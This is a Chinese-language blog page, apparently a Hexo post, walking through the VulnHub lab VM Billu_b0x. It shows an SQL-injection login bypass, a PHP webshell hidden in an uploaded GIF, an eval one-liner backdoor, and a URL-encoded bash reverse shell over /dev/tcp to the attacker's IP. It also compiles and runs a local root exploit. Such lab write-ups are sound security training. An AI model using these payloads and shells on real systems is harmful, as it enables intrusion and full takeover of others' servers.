@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JangVeigar | JangVeigar</title><meta name="description" content="title: Billu_b0x通关笔记date: 2020-08-17 20:45:18categories: “vulnhub”tags: - &quot;vulnhub&quot; - &quot;靶机&quot; 0.介绍靶机名称：Billu_b0x 下载链接：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;billu&#x2F;Billu_b0x.zip 虚拟机难度中等，使用ubuntu"><meta name="author" content="Jang Veigar"><meta name="copyright" content="Jang Veigar"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/2020/08/17/Billu-b0x%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="JangVeigar"><meta property="og:url" content="http://yoursite.com/2020/08/17/Billu-b0x%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><meta property="og:site_name" content="JangVeigar"><meta property="og:description" content="title: Billu_b0x通关笔记date: 2020-08-17 20:45:18categories: “vulnhub”tags: - &quot;vulnhub&quot; - &quot;靶机&quot; 0.介绍靶机名称：Billu_b0x 下载链接：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;billu&#x2F;Billu_b0x.zip 虚拟机难度中等，使用ubuntu"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2020-08-17T12:45:18.366Z"><meta property="article:modified_time" content="2020-08-20T02:52:08.419Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-08-20 10:52:08'
+}</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 5.0.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">7</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0.介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">1.信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-web"><span class="toc-number">3.</span> <span class="toc-text">2.web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Aphpmyadmin"><span class="toc-number">3.1.</span> <span class="toc-text">2.1方法一：phpmyadmin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%89%8D%E5%8F%B0%E7%99%BB%E5%BD%95%E6%A1%86%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 方法二：前台登录框绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%9B%E5%85%A5web%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.</span> <span class="toc-text">3.进入web系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">4.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E8%9A%81%E5%89%91"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 蚁剑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2nc%E5%8F%8D%E5%BC%B9"><span class="toc-number">5.2.</span> <span class="toc-text">4.2nc反弹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">最简单的方法</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">JangVeigar</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">无题</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-17T12:45:18.366Z" title="发表于 2020-08-17 20:45:18">2020-08-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-08-20T02:52:08.419Z" title="更新于 2020-08-20 10:52:08">2020-08-20</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>title: Billu_b0x通关笔记<br>date: 2020-08-17 20:45:18<br>categories: “vulnhub”<br>tags:</p>
+<pre><code>- &quot;vulnhub&quot;
+- &quot;靶机&quot;</code></pre>
+<h3 id="0-介绍"><a href="#0-介绍" class="headerlink" title="0.介绍"></a>0.介绍</h3><p>靶机名称：Billu_b0x</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/billu/Billu_b0x.zip">https://download.vulnhub.com/billu/Billu_b0x.zip</a></p>
+<p>虚拟机难度中等，使用ubuntu（32位）,其他软件包有：PHP，apache，MySQL</p>
+<p>目标：Boot to root：从Web应用程序进入虚拟机，并获得root权限。</p>
+<p>攻击机：kali</p>
+<p>攻击机ip：192.168.110.128   (NAT)</p>
+<p>靶机ip：网络连接方式设置为NAT，靶机自动获取IP</p>
+<h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>因为是自动获取ip,kali与靶机处同一网段，所以用nmap扫一下同网段存活主机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.110.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="nmap.png" alt="nmap"></p>
+<p>可以看到已经扫出靶机ip：192.168.110.130，再扫一下全端口，输出到billu.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.110.130 -oN billu.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="nmap-p.png" alt="nmap-p"></p>
+<h3 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h3><p>先看一下80端口进去是什么，一个登录界面，标题中含有Show me your SQLI skills ,可能是<strong>注入</strong></p>
+<p><img src="80.png" alt="80"></p>
+<p>看一下源码</p>
+<p><img src="view80.png" alt="view80"></p>
+<p>不急着注入，先扫一下目录，这里我用的是dirb</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.110.130 &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;big.txt </span><br></pre></td></tr></table></figure>
+
+<p>这是扫出来的结果</p>
+<p><img src="dirb.png" alt="dirb"></p>
+<p>发现几个有意思的页面,好家伙，全是重要文件。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add.php       上传</span><br><span class="line">&#x2F;test.php      有个file参数</span><br><span class="line">&#x2F;in.php           phpinfo</span><br><span class="line">&#x2F;c.php            config.php</span><br><span class="line">&#x2F;panel.php     本地包含</span><br></pre></td></tr></table></figure>
+
+<p>经过测试发现test.php文件有文件包含漏洞</p>
+<p><img src="testdownload.png" alt="testdownload"></p>
+<p>那就把刚刚的几个文件下载看一下</p>
+<p><img src="add.png" alt="add"></p>
+<p><img src="add-php.png" alt="add-php"></p>
+<p>add.php下载下来分析一下，纯静态页面，无法上传</p>
+<p><img src="test.png" alt="test"></p>
+<p>file参数，文件包含漏洞</p>
+<p><img src="phpinfo.png" alt="phpinfo"></p>
+<p>知道了网站绝对路径 <code> /var/www/</code></p>
+<p><img src="c.png" alt="c"></p>
+<p>config.php，包含数据库帐号密码</p>
+<p><img src="panel.png" alt="panel"></p>
+<p>这里有本地包含</p>
+<h4 id="2-1方法一：phpmyadmin"><a href="#2-1方法一：phpmyadmin" class="headerlink" title="2.1方法一：phpmyadmin"></a>2.1方法一：phpmyadmin</h4><p>刚才扫出来有个目录叫phpmy,访问一下，果然是phpmyadmin</p>
+<p>直接拿上面的账号密码登录 <code> billu:b0x_billu</code></p>
+<p>进入phpmyadmin</p>
+<p><img src="phpmyadmin.png" alt="phpmyadmin"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以通过写shell进行提权，而我们需要满足以下条件：</span><br><span class="line">1.数据库root权限</span><br><span class="line">2.知道网站的物理路径 phpinfo()</span><br><span class="line">3.数据库有写权限</span><br><span class="line">select &#39;&lt;?php eval($_POST&#x3D;[123];)?&gt;&#39;  INTO OUTFILE  &#39;&#x2F;var&#x2F;www&#x2F;123.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p>很明显不行，<strong>不是root权限</strong>，换一种方法</p>
+<p>测试是否有写权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;</span><br><span class="line">secure-file-priv特性</span><br><span class="line">secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE(.png)传到哪个指定目录的。</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值为null ，表示限制mysql 不允许导入|导出</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysql 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line"></span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysql 的导入|导出做限制</span><br></pre></td></tr></table></figure>
+
+<p><img src="secure_file_priv.png" alt="secure_file_priv"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.show variables like &#39;general_log&#39;; 查询日志是否开启</span><br><span class="line">2.set global general_log&#x3D;&#39;on&#39;      # 开启日志</span><br><span class="line">3.set global  general_log_file &#x3D;&quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;she.php&quot;       # 日志写入的文件</span><br><span class="line">4.select &quot;&lt;?php eval($_POST[&#39;x&#39;])?&gt;&quot;      # 执行带有一句话的sql语句</span><br></pre></td></tr></table></figure>
+
+<p>但是<strong>日志关闭了</strong>，且不是root用户，看来通过phpmyadmin直接getwebshell是不行的，</p>
+<p>查看auth表，其中有前面登录框密码：<code>biLLu:hEx_it</code></p>
+<p><img src="t-auth.png" alt="t-auth"></p>
+<h4 id="2-2-方法二：前台登录框绕过"><a href="#2-2-方法二：前台登录框绕过" class="headerlink" title="2.2 方法二：前台登录框绕过"></a>2.2 方法二：前台登录框绕过</h4><p>用test.php包含漏洞下载index.php文件，审计过滤规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;un&#39;]));</span><br><span class="line"></span><br><span class="line">$pass&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;ps&#39;]));</span><br></pre></td></tr></table></figure>
+
+<p>str_replace的作用是将字符串&#39; 替换为空，因此构造SQL注入登录payload时，必须含有&#39;字符串，否则会报错。urldecode的作用是将输入解码。</p>
+<p>绕过<code>or 1=1 -- \</code> ，登录框可密码框都需要输入这个</p>
+<p><img src="sqlbypass.png" alt="sqlbypass"></p>
+<h3 id="3-进入web系统"><a href="#3-进入web系统" class="headerlink" title="3.进入web系统"></a>3.进入web系统</h3><p>进入系统之后，首页是一个查看用户页面，</p>
+<p><img src="login.png" alt="login"></p>
+<p>这里可以增加user，应该可以上传图片</p>
+<p><img src="adduser.png" alt="adduser"></p>
+<p>这里搞个cmd命令一句话，加个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传之后查看一下图片</p>
+<p><img src="uploadjpg.png" alt="uploadjpg"></p>
+<p><img src="catjpg.png" alt="catjpg"></p>
+<p>然后用panel.php来包含一下</p>
+<p><img src="cmdinfo.png" alt="cmdinfo"></p>
+<p>然后找一下哪个目录有写权限，方便写个马进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+
+<p>刚刚那个图片目录就有权限</p>
+<p><img src="ls-al.png" alt="ls-al"></p>
+<p>接下来就简单了</p>
+<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><h4 id="4-1-蚁剑"><a href="#4-1-蚁剑" class="headerlink" title="4.1 蚁剑"></a>4.1 蚁剑</h4><p>直接写个一句话进去，用蚁剑连</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;panel.php?cmd&#x3D;echo &#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39; &gt;&gt; uploaded_images&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="echoshell.png" alt="echoshell"></p>
+<p>蚁剑连接成功</p>
+<p><img src="Ant.png" alt="Ant"></p>
+<p>蚁剑虚拟终端执行一下命令，查看一下系统版本和内核</p>
+<p><img src="banner.png" alt="banner"></p>
+<p>在kali中searchsploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 12.04</span><br></pre></td></tr></table></figure>
+
+<p><img src="searchsploit.png" alt="searchsploit"></p>
+<p><img src="searchsploit.png" alt="searchsploit"></p>
+<p>拷贝出来，给权限，然后用gcc 编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;37292.c &#x2F;root&#x2F;</span><br><span class="line">chmod 777 37292.c</span><br><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></table></figure>
+
+<p>上传到目标机，执行,提权失败，应该是虚拟终端的缘故，所以要nc反弹一个shell</p>
+<p><img src="Antfailed.png" alt="Antfailed"></p>
+<h4 id="4-2nc反弹"><a href="#4-2nc反弹" class="headerlink" title="4.2nc反弹"></a>4.2nc反弹</h4><p>直接开启nc,监听6666端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure>
+
+<p>然后利用panel的本地包含运行cmd.jpg命令马，反向反弹一下,<strong>注意此处命令一定要url编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;panel.php?cmd&#x3D;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.110.128&#x2F;6666 0&gt;&amp;1&#39; | bash</span><br><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;panel.php?cmd&#x3D;echo%20&#39;bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.110.128%2f6666%200%3e%261&#39;%20%7c%20bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="echoncshell.png" alt="echoncshell"></p>
+<p>成功反弹shell，也可以用蚁剑的虚拟终端来反弹shell到nc</p>
+<p><img src="ncsuccess.png" alt="ncsuccess"></p>
+<p>然后执行exp，提权成功</p>
+<p><img src="rootsuccess.png" alt="rootsuccess"></p>
+<h3 id="最简单的方法"><a href="#最简单的方法" class="headerlink" title="最简单的方法"></a>最简单的方法</h3><p>这里还可以猜测 phpmyadmin 的配置文件 路径 <code> /var/www/phpmy/config.inc.php</code></p>
+<p>用test.php下载试试，果然存在，</p>
+<p><img src="downloadconfigincphp.png" alt="downloadconfigincphp"></p>
+<p><img src="catconfigincphp.png" alt="catconfigincphp"></p>
+<p>root密码都有了：<code> root:roottoor</code>，直接上SSH,成功</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jang Veigar</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/08/17/Billu-b0x%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">http://yoursite.com/2020/08/17/Billu-b0x%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">JangVeigar</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/20/kali%E4%B8%ADnc%E8%B8%A9%E5%9D%91%E5%B0%8F%E8%AE%B0/"><img class="prev-cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kali中nc踩坑小记</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/16/nc%E5%8F%8D%E5%BC%B9shell%E5%B0%8F%E8%AE%B0/"><img class="next-cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">nc反弹shell小记</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Jang Veigar</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
